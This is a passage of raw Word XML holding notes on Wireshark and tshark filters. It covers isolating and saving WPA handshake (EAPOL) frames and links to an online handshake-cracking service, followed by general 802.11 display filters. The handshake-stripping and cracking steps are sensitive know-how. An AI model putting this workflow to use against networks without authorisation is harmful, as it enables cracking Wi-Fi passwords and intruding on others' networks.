          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="30AFC8C0" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004F4FAB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark filter for handshakes </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B532D5" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00AA52EE" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>EAPOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6C0159" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="004F4FAB" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Display filter for mac address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6787D162" w14:textId="2DB05C0C" w:rsidR="00C14F90" w:rsidRPr="000F33A6"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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 -R "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>eth.addr</w:t>
      </w:r>
      <w:proofErr w:type="spell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eq</w:t>
      </w:r>
      <w:proofErr w:type="spell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xx:xx:xx:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59576EE5" w14:textId="42FCA713" w:rsidR="00E71FE9" w:rsidRPr="00812CFB" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E71FE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>How to Strip your Handshake with Wireshark:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A463DBB" w14:textId="77777777" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Open your Capture in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7359DCA6" w14:textId="77777777" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43BAF00C" w14:textId="71A260D0" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Enter "</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">eapol || </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 0x04 || </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 0x08</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>" as filter expression (without quotes) then press "Apply"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D68EE64" w14:textId="77777777" w:rsidR="00812CFB" w:rsidRPr="008D1A6B" w:rsidRDefault="00812CFB" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5938585B" w14:textId="7597D047" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> Go to File -&gt; Save As</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>. Menu, Enter new File name and select "Displayed" to save filtered packets only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1E1E6A" w14:textId="77777777" w:rsidR="00E71FE9" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E6610B5" w14:textId="0CCE7DB5" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Online handshake crack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9BB729" w14:textId="41614D85" w:rsidR="008D1A6B" w:rsidRPr="008D1A6B" w:rsidRDefault="0071739C" w:rsidP="008D1A6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="008D1A6B" w:rsidRPr="00BB71AD">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>https://www.cloudcracker.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3CACEBBD" w14:textId="77777777" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AC51028" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Display Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7509BCE6" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>A complete list of 802.11 display filter fields can be found in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan_mgt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, and </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan_aggregate</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> display filter references. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF91873"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Show only the 802.11-based traffic: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0E3A75" w14:textId="6ACC1641" w:rsidR="00F573A9" w:rsidRPr="00775D5B" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="12C731DB"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Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Show only the 802.11-based traffic to and from 802.11 MAC address 08:00:08:15:ca</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>:fe</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B045CA1" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRPr="00775D5B" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==08.00.08.15.ca.fe </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D183A4"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Hide beacon frames: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D464626"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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> != 0x08</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A8122" w14:textId="77777777" w:rsidR="00781C97"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Show management frames for a specific SSID: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501F464B" w14:textId="1DE8EB71" w:rsidR="00F573A9" w:rsidRPr="00781C97" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
